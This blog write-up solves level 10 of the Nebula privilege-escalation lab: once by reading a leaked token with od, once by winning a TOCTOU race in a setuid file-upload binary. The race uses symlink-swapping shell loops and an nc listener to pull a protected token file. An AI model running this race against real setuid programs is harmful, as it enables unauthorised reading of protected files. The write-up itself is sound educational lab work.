<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <meta name="description" content="">

    
      <link href="https://fonts.googleapis.com/css?family=Open+Sans:400|Old+Standard+TT:400&display=swap" rel="stylesheet" media="print" type="text/css" onload="this.media='all'">
    

    <title>
      
      
         Writeup: nebula (level 10) 
      
    </title>
    <link rel="canonical" href="https://chuang76.github.io/posts/nebula_p4/">

    <style>
  * {
    border:0;
    font:inherit;
    font-size:100%;
    vertical-align:baseline;
    margin:0;
    padding:0;
    color: black;
    text-decoration-skip: ink;
  }

  body {
     
     
    font-family: 'Verdana'; 
     
     
    font-size:17px;
    line-height:160%;
    color:#1d1313;
    max-width:700px;
    margin:auto;
  }

  p {
    margin: 20px 0;
  }

  a img {
    border:none;
  }

  img {
    margin: 10px auto 10px auto;
    max-width: 100%;
    display: block;
  }

  .left-justify { float: left; }
  .right-justify { float:right; }

  pre, code {
    font: 12px Consolas, "Liberation Mono", Menlo, Courier, monospace;
    background-color: #f7f7f7;
  }

  code {
    font-size: 12px;
    padding: 4px;
  }

  pre {
    margin-top: 0;
    margin-bottom: 16px;
    word-wrap: normal;
    padding: 16px;
    overflow: auto;
    font-size: 85%;
    line-height: 1.45;
  }

  pre>code {
    padding: 0;
    margin: 0;
    font-size: 100%;
    word-break: normal;
    white-space: pre;
    background: transparent;
    border: 0;
  }

  pre code {
    display: inline;
    padding: 0;
    margin: 0;
    overflow: visible;
    line-height: inherit;
    word-wrap: normal;
    background-color: transparent;
    border: 0;
  }

  pre code::before,
  pre code::after {
    content: normal;
  }

  em,q,em,dfn {
    font-style:italic;
  }

  .sans,html .gist .gist-file .gist-meta {
    font-family:"Open Sans","Myriad Pro",Myriad,sans-serif;
  }

  .mono,pre,code,tt,p code,li code {
    font-family:Menlo,Monaco,"Andale Mono","lucida console","Courier New",monospace;
  }

  .heading,.serif,h1,h2,h3 {
    font-family:"Old Standard TT",serif;
  }

  strong {
    font-weight:600;
  }

  q:before {
    content:"\201C";
  }

  q:after {
    content:"\201D";
  }

  del,s {
    text-decoration:line-through;
  }

  blockquote {
    font-family:"Old Standard TT",serif;
    text-align:center;
    padding:50px;
  }

  blockquote p {
    display:inline-block;
    font-style:italic;
  }

  blockquote:before,blockquote:after {
    font-family:"Old Standard TT",serif;
    content:'\201C';
    font-size:35px;
    color:#403c3b;
  }

  blockquote:after {
    content:'\201D';
  }

  hr {
    width:40%;
    height: 1px;
    background:#403c3b;
    margin: 25px auto;
  }

  h1 {
    font-size:35px;
  }

  h2 {
    font-size:28px;
  }

  h3 {
    font-size:22px;
    margin-top:18px;
  }

  h1 a,h2 a,h3 a {
    text-decoration:none;
  }

  h1,h2 {
    margin-top:28px;
  }

  #sub-header, .date {
    color:#403c3b;
    font-size:13px;
  }

  #sub-header {
    margin: 0 4px;
  }

  #nav h1 a {
    font-size:35px;
    color:#1d1313;
    line-height:120%;
  }

  .posts_listing a,#nav a {
    text-decoration: none;
  }

  li {
    margin-left: 20px;
  }

  ul li {
    margin-left: 5px;
  }

  ul li {
    list-style-type: none;
  }
  ul li:before {
    content:"\00BB \0020";
  }

  #nav ul li:before, .posts_listing li:before {
    content:'';
    margin-right:0;
  }

  #content {
    text-align:left;
    width:100%;
    font-size:15px;
    padding:60px 0 80px;
  }

  #content h1,#content h2 {
    margin-bottom:5px;
  }

  #content h2 {
    font-size:25px;
  }

  #content .entry-content {
    margin-top:15px;
  }

  #content .date {
    margin-left:3px;
  }

  #content h1 {
    font-size:30px;
  }

  .highlight {
    margin: 10px 0;
  }

  .posts_listing {
    margin:0 0 50px;
  }

  .posts_listing li {
    margin:0 0 25px 15px;
  }

  .posts_listing li a:hover,#nav a:hover {
    text-decoration: underline;
  }

  #nav {
    text-align:center;
    position:static;
    margin-top:60px;
  }

  #nav ul {
    display: table;
    margin: 8px auto 0 auto;
  }

  #nav li {
    list-style-type:none;
    display:table-cell;
    font-size:15px;
    padding: 0 20px;
  }

  #links {
    display: flex;
    justify-content: space-between;
    margin: 50px 0 0 0;
  }

  #links :nth-child(1) {
    margin-right:0.5em;;
  }

  #links :nth-child(2) {
    margin-left:0.5em;;
  }

  #not-found {
    text-align: center;
  }

  #not-found a {
    font-family:"Old Standard TT",serif;
    font-size: 200px;
    text-decoration: none;
    display: inline-block;
    padding-top: 225px;
  }

  @media (max-width: 750px) {
    body {
      padding-left:20px;
      padding-right:20px;
    }

    #nav h1 a {
      font-size:28px;
    }

    #nav li {
      font-size:13px;
      padding: 0 15px;
    }

    #content {
      margin-top:0;
      padding-top:50px;
      font-size:14px;
    }

    #content h1 {
      font-size:25px;
    }

    #content h2 {
      font-size:22px;
    }

    .posts_listing li div {
      font-size:12px;
    }
  }

  @media (max-width: 400px) {
    body {
      padding-left:20px;
      padding-right:20px;
    }

    #nav h1 a {
      font-size:22px;
    }

    #nav li {
      font-size:12px;
      padding: 0 10px;
    }

    #content {
      margin-top:0;
      padding-top:20px;
      font-size:12px;
    }

    #content h1 {
      font-size:20px;
    }

    #content h2 {
      font-size:18px;
    }

    .posts_listing li div{
      font-size:12px;
    }
  }

  @media (prefers-color-scheme: dark) {
    *, #nav h1 a {
      color: #FDFDFD;
    }

    body {
      background: #121212;
    }

    pre, code {
      background-color: #262626;
    }

    #sub-header, .date {
      color: #BABABA;
    }

    hr {
      background: #EBEBEB;
    }
  }
</style>


    </head>

  <body>
    <section id=nav>
      <h1><a href="https://chuang76.github.io/">Before Dawn</a></h1>
      <ul>
        
      </ul>
    </section>


<section id=content>
  <h1> Writeup: nebula (level 10) </h1>

  
    <div id=sub-header>
      December 2020 
    </div>
  

  <div class="entry-content">
    <p>Nebula is a virtual machine that covers a variety of challenges about Linux privilege escalation, scripting language issues, and file system race conditions. It is available at <a href="https://exploit-exercises.lains.space/">Exploit Exercises</a>.</p>
<!-- raw HTML omitted -->
<h2 id="level-10">Level 10</h2>
<p>The description of Level 10 is provided as follows.</p>
<pre><code>The setuid binary at /home/flag10/flag10 binary will upload any file given, 
as long as it meets the requirements of the access() system call.

To do this level, log in as the level10 account with the password level10. 
Files for this level can be found in /home/flag10.
</code></pre><!-- raw HTML omitted -->
<h2 id="solution-1">Solution 1</h2>
<p>In this challenge, Nebula left a sensitive file &ldquo;x&rdquo; in /home/level10.</p>
<p><img src="https://github.com/chuang76/image/blob/master/10-2.PNG?raw=true" alt=""></p>
<p>It contains ASCII text. Though it shows nothing when we type in cat command (since the file may contain too many blank lines), we can use od command to view the contents of x instead.</p>
<p><img src="https://github.com/chuang76/image/blob/master/10-3.PNG?raw=true" alt=""></p>
<p>As you can see, it shows 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27. This strange token may be the password. Let&rsquo;s give it a try.</p>
<p><img src="https://github.com/chuang76/image/blob/master/10-4.PNG?raw=true" alt=""></p>
<p>Here is the flag.</p>
<p><img src="https://github.com/chuang76/image/blob/master/10-5.PNG?raw=true" alt=""></p>
<!-- raw HTML omitted -->
<h2 id="solution-2">Solution 2</h2>
<p>Let&rsquo;s go back to the directory /home/flag10. Here is its contents.</p>
<p><img src="https://github.com/chuang76/image/blob/master/10-1.PNG?raw=true" alt=""></p>
<p>The source code of the executable flag10 is available. The program is going to check the file permission, create a socket, connect to the port 18211, then read something from the file, and write (send) the data to the socket.</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &lt; 3) {
      printf(&quot;%s file host\n\tsends file to host if you have access to it\n&quot;, argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf(&quot;Connecting to %s:18211 .. &quot;, host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&amp;sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
          printf(&quot;Unable to connect to host %s\n&quot;, host);
          exit(EXIT_FAILURE);
      }

#define HITHERE &quot;.oO Oo.\n&quot;
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf(&quot;Unable to write banner to host %s\n&quot;, host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf(&quot;Connected!\nSending file .. &quot;); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf(&quot;Damn. Unable to open file\n&quot;);
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf(&quot;Unable to read from file: %s\n&quot;, strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf(&quot;wrote file!\n&quot;);

  } else {
      printf(&quot;You don't have access to %s\n&quot;, file);
  }
}
</code></pre><!-- raw HTML omitted -->
<h2 id="the-first-attempt">The first attempt</h2>
<p>Our goal is to view the contents of the file &ldquo;token&rdquo;. So I just create a file in /tmp directory which is pointed to /home/flag10/token via the symbolic link. Then open two terminals (you can use Ctrl + Alt + Fn to switch between TTYs), for the one is used to listen the port and receive the message, the other is used to run the executable /home/flag10/flag10 with the argument 127.0.0.1 (host) and /tmp/vul (file).</p>
<p>However, it&rsquo;s failed. The error message indicates that I don&rsquo;t have access to the file. The reason is: the argument R_OK in the function access() checks <em>real user ID</em>, not effective user ID like open() function checks. Therefore, we can not pass the verification access() simply with the symbolic link.</p>
<!-- raw HTML omitted -->
<h2 id="the-second-attempt">The second attempt</h2>
<p>Let&rsquo;s view the source code again. The program is a classical <a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">time-of-check to time-of-use</a> (TOCTOU), which is a software bug caused by the race condition. Though we don&rsquo;t have the ability to change the internal memory of the program, we can exploit the race condition to trick the Set-UID. That is, after passing the verification, and before opening the file, we make the file points to our target file /home/flag10/token. Since modern processors run billions of instructions per second, the duration (TOCTOU window) is very short, we need to try it repeatedly. To win the race condition, we can design the workflow as follows.</p>
<pre><code>1. TTY1: used to keep listening to the port 18211
2. TTY2: keep running the executable /home/flag10/flag10
3. TTY3: keep creating a symbolic link to a writable file (pass the verfication)
         and creating another symbolic link to /home/flag10/token (our target)
</code></pre><p>Hence, for TTY1, run</p>
<pre><code>$ nc -k -l 18211
</code></pre><p>for TTY2, run</p>
<pre><code>$ while true; do /home/flag10/flag10 /tmp/vul 127.0.0.1; done
</code></pre><p>for TTY3, run</p>
<pre><code>$ while true; do ln -sf /tmp/test /tmp/vul; ln -sf /home/flag10/token /tmp/vul; done
</code></pre><p>Here is the result of TTY1. As you can see, sometimes it prints out &ldquo;test&rdquo; (contents of /tmp/test), while sometimes it prints out the contents of our target file, /home/flag10/token.</p>
<p><img src="https://github.com/chuang76/image/blob/master/10-10.PNG?raw=true" alt=""></p>
<p>Here is the flag.</p>
<p><img src="https://github.com/chuang76/image/blob/master/10-11.PNG?raw=true" alt=""></p>

  </div>

  <div id=links>
    
      <a href="https://chuang76.github.io/posts/nebula_p3/">&laquo;&nbsp;Writeup: nebula (level 6 - level 8)</a>
    
    
      <a href="https://chuang76.github.io/posts/bof/">Buffer overflow attack&nbsp;&raquo;</a>
    
  </div>
</section>

  
</body>
</html>



